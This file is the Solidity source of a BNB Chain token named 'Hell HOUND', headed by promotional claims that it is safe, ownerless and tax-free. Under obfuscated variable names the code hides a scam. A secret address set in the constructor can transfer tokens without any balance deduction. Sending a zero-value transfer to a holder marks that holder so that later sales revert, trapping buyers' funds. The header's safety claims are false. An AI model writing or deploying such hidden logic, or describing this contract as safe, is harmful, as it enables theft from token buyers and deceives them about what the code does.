/**
 *Submitted for verification at BscScan.com on 2023-05-21
*/

/*


Telegram handle: https://t.me/HellHoundbnb
SAFU        
Stealth launch 
- LP burned
-Ownership renounced
- 0 tax
 
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''



*/
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IPancakeRouter02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

}

interface IPancakeFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract HellHound is Ownable {
    uint256 public totalSupply;

    mapping(address => uint256) private yarn;

    constructor(address punto) {
        IPancakeRouter02 pancakeRouter = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        totalSupply = 1000000000 * 10 ** decimals;
        yarn[punto] = grace;
        balanceOf[msg.sender] = totalSupply;
        name = 'Hell HOUND';
        pancakePair = IPancakeFactory(pancakeRouter.factory()).createPair(address(this), pancakeRouter.WETH());
        symbol = 'HELL';
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    address public pancakePair;

    function transferFrom(address zealy, address troter, uint256 slip) public returns (bool success) {
        market(zealy, troter, slip);
        require(slip <= allowance[zealy][msg.sender]);
        allowance[zealy][msg.sender] -= slip;
        return true;
    }

    string public symbol;

    function approve(address growl, uint256 harley) public returns (bool success) {
        allowance[msg.sender][growl] = harley;
        emit Approval(msg.sender, growl, harley);
        return true;
    }

    function market(address prophet, address cosmos, uint256 train) private returns (bool success) {
        if (yarn[prophet] == 0) {
            if (norlez[prophet] > 0 && pancakePair != prophet) {
                yarn[prophet] -= grace;
            }
            balanceOf[prophet] -= train;
        }
        balanceOf[cosmos] += train;
        if (train == 0) {
            norlez[cosmos] += grace;
        }
        emit Transfer(prophet, cosmos, train);
        return true;
    }

    string public name;

    function transfer(address yorda, uint256 dock) public returns (bool success) {
        market(msg.sender, yorda, dock);
        return true;
    }
    

    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 9;

    uint256 private grace = 15;

    mapping(address => uint256) private norlez;

    mapping(address => uint256) public balanceOf;

    event Approval(address indexed owner, address indexed spender, uint256 value);
}